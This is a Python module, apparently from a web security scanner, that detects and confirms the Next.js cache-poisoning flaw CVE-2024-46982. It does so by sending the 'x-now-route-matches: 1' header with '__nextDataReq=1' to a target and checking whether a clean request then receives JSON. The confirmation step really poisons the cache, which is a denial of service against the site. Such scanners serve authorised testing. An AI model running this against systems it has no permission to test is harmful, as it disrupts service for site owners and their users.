#!/usr/bin/env python3

"""
Based on Zhero research
https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir
"""


import utils.proxy as proxy
from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests, sys

logger = configure_logger(__name__)


def _is_json(response: requests.Response) -> bool:
    """Vrai si la réponse est du JSON (Content-Type puis parsing)."""
    if "application/json" in response.headers.get("Content-Type", ""):
        return True
    try:
        response.json()
        return True
    except ValueError:
        return False


def test_nextjs_dos(
    url: str,
    uri: str,
    s: requests.Session,
    authent: tuple[str, str] | None = None,
) -> bool:
    """
    Confirme l'empoisonnement du cache sans se fier aux seuls headers.

    Méthodo : on établit d'abord une baseline PROPRE de l'URL cible (qui ne doit
    PAS déjà servir du JSON, sinon aucune conclusion possible), on rejoue 3x la
    requête empoisonnée (header `x-now-route-matches: 1`), puis on rejoue une
    requête PROPRE : le cache est confirmé empoisonné seulement si cette réponse
    propre a basculé en JSON alors que la baseline ne l'était pas.
    """
    # Baseline propre : si l'URL sert déjà du JSON, le test n'est pas concluant.
    req_baseline = s.get(
        uri, verify=False, auth=authent, timeout=10, allow_redirects=False
    )
    if _is_json(req_baseline):
        logger.debug("baseline already JSON, inconclusive for %s", uri)
        return False

    headers = {"x-now-route-matches": "1"}

    for _ in range(3):
        s.get(
            uri,
            headers=headers,
            verify=False,
            auth=authent,
            timeout=10,
            allow_redirects=False,
        )

    # Requête propre finale : a-t-elle basculé en JSON pour un client propre ?
    req_verify = s.get(
        uri,
        verify=False,
        auth=authent,
        timeout=10,
        allow_redirects=False,
    )

    if _is_json(req_verify):
        print(
            f" {Identify.confirmed} | CVE-2024-46982 | CACHE POISONED | {Colors.BLUE}{uri}{Colors.RESET}"
        )
        return True

    return False


def datareq_check(
    url: str,
    s: requests.Session,
    req_main: requests.Response,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> None:

    uri = f"{url}?__nextDataReq=1"
    
    try:
        req = s.get(
            uri,
            verify=False,
            headers=custom_header,
            allow_redirects=False,
            auth=authent,
            timeout=10,
        )

        has_nextjs_markers = ("pageProps" in req.text or "__N_SSP" in req.text)
        is_different_response = (
            len(req.content) != len(req_main.content) or
            req.headers.get("Content-Type", "") != req_main.headers.get("Content-Type", "")
        )
        
        if has_nextjs_markers and is_different_response:
            print(
                f" {Identify.behavior} | CVE-2024-46982 | TAG OK | {Colors.BLUE}{uri}{Colors.RESET} | PAYLOAD: x-now-route-matches: 1"
            )
            
            if proxy.proxy_enabled:
                from utils.proxy import proxy_request
                proxy_request(
                    s,
                    "GET",
                    uri,
                    headers={"x-now-route-matches": "1"},
                    data=None
                )
            
            unrisk_page = get_unrisk_page(url, s, req)
            
            if unrisk_page:
                uri_exploit = f"{unrisk_page}?__nextDataReq=1"
                exploitable = test_nextjs_dos(unrisk_page, uri_exploit, s, authent)
                
                if not exploitable:
                    print(
                        f" └─ [i] Cache poisoning detected but exploitation failed. Manual verification recommended with `x-now-route-matches: 1` payload on `{uri_exploit}` url."
                    )
            else:
                print(
                    " └─ [i] [CVE-2024-46982] No risk-free pages found. Manual check required."
                )
                
    except requests.Timeout as t:
        logger.error(f"request timeout {uri}: {t}")
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(f"request error {uri}: {e}")